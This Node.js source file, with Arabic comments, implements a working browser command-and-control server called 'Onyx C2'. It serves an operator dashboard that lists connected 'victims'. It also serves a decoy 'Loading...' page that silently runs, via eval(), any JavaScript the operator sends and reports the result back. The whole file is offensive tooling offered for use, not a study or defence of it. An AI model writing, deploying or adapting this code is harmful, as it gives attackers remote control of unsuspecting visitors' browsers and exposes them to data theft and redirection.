const express = require('express');
const http = require('http');
const { Server } = require('socket.io');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

const PORT = process.env.PORT || 3000;
let victims = {};

// لوحة التحكم الكاملة للسيطرة وإرسال الأوامر
app.get('/dashboard', (req, res) => {
    res.send(`
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <title>Onyx C2 Master Panel</title>
        <style>
            body { background: #0b0f19; color: #f8fafc; font-family: monospace; padding: 20px; }
            h1 { color: #38bdf8; }
            .card { background: #1e293b; border: 1px solid #334155; padding: 15px; margin-bottom: 15px; border-radius: 8px; }
            input, button { background: #334155; color: white; border: 1px solid #475569; padding: 8px; border-radius: 4px; margin-top: 5px; }
            button { cursor: pointer; background: #0284c7; }
            pre { background: #0f172a; padding: 10px; border-radius: 4px; color: #4ade80; overflow-x: auto; margin-top: 5px; }
        </style>
    </head>
    <body>
        <h1>لوحة التحكم والسيطرة - Onyx C2</h1>
        <div id="list">جاري البحث عن الأجهزة...</div>

        <script src="/socket.io/socket.io.js"></script>
        <script>
            const socket = io();
            socket.emit('admin-join');

            socket.on('refresh-list', (data) => {
                const list = document.getElementById('list');
                const keys = Object.keys(data);
                if(keys.length === 0) {
                    list.innerHTML = 'لا توجد أجهزة متصلة حالياً...';
                    return;
                }
                list.innerHTML = '';
                keys.forEach(id => {
                    list.innerHTML += \`
                        <div class="card">
                            <strong>معرف الجهاز:</strong> \${id}<br>
                            <strong>المتصفح:</strong> \${data[id].ua}<br>
                            <input type="text" id="cmd-\${id}" placeholder="اكتب الأمر (مثال: alert('Hacked') أو location.href='...')" style="width: 70%;">
                            <button onclick="sendCmd('\${id}')">تنفيذ الأمر</button>
                            <pre id="out-\${id}">في انتظار الرد...</pre>
                        </div>
                    \`;
                });
            });

            function sendCmd(id) {
                const cmd = document.getElementById('cmd-' + id).value;
                if(!cmd) return;
                socket.emit('admin-cmd', { targetId: id, command: cmd });
            }

            socket.on('cmd-res', (data) => {
                const pre = document.getElementById('out-' + data.id);
                if(pre) pre.innerText = data.result;
            });
        </script>
    </body>
    </html>
    `);
});

// صفحة الضحية الوهمية التي يفتحها المستهدف
app.get('/', (req, res) => {
    res.send(`
    <!DOCTYPE html>
    <html lang="ar">
    <head><meta charset="UTF-8"><title>Loading...</title></head>
    <body>
        <h2>جاري التحميل، يرجى الانتظار...</h2>
        <script src="/socket.io/socket.io.js"></script>
        <script>
            const socket = io();
            socket.emit('victim-join', { ua: navigator.userAgent });

            // استقبال الأوامر وتنفيذها تلقائياً وإرجاع النتيجة
            socket.on('run-cmd', async (cmd) => {
                try {
                    let res = eval(cmd);
                    if (res instanceof Promise) res = await res;
                    socket.emit('cmd-res', { result: String(res) });
                } catch (err) {
                    socket.emit('cmd-res', { result: "Error: " + err.message });
                }
            });
        </script>
    </body>
    </html>
    `);
});

io.on('connection', (socket) => {
    socket.on('victim-join', (data) => {
        victims[socket.id] = { data: data, socket: socket };
        io.to('admins').emit('refresh-list', getVictimsClean());
    });

    socket.on('admin-join', () => {
        socket.join('admins');
        socket.emit('refresh-list', getVictimsClean());
    });

    socket.on('admin-cmd', (data) => {
        const target = victims[data.targetId];
        if(target) {
            target.socket.emit('run-cmd', data.command);
            target.socket.once('cmd-res', (res) => {
                io.to('admins').emit('cmd-res', { id: data.targetId, result: res.result });
            });
        }
    });

    socket.on('disconnect', () => {
        if(victims[socket.id]) {
            delete victims[socket.id];
            io.to('admins').emit('refresh-list', getVictimsClean());
        }
    });
});

function getVictimsClean() {
    let clean = {};
    for(let id in victims) {
        clean[id] = { ua: victims[id].data.ua };
    }
    return clean;
}

server.listen(PORT, () => {
    console.log('Server running on port ' + PORT);
});
